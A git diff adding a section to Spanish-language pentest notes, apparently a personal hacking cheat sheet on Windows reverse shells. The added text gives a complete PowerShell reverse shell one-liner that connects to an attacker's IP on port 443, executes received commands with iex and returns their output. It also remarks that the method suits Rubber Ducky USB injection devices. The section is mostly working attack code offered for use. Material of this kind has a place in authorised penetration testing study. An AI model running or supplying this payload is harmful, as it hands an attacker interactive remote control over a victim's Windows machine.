@@ -82,6 +82,14 @@ Con el siguiente comando creamos un `ejecutable` que si lo ejecutamos en la máq
 
 ## Powershell Reverse Shell One-Liner
 
+En `Powershell` que es un lenguaje muy potente que maneja `Windows` hay un comando con el que nos podemos mandar una reverse shell con una única linea de codigo:
+
+```
+> $client = New-Object System.Net.Sockets.TCPClient("<tu IP>",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+No es muy recomendable utilizar este metodo para obtener acceso desde una `webshell` o desde una `cmd`, pero `es muy util para Rubber Duckys`.
+
 ## Nishang
 
 ## ConPtyShell
